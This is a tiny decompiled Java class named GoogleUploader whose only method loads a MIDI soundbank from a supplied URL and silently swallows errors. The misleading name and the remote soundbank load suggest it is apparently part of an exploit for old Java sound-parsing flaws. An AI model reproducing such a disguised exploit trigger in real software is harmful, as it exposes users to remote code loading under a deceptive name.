import javax.sound.midi.MidiSystem;
import java.net.URL;

// 
// Decompiled by Procyon v0.5.30
// 

public class GoogleUploader
{
    public static void init(final URL url) {
        try {
            MidiSystem.getSoundbank(url);
        }
        catch (Exception ex) {}
    }
}
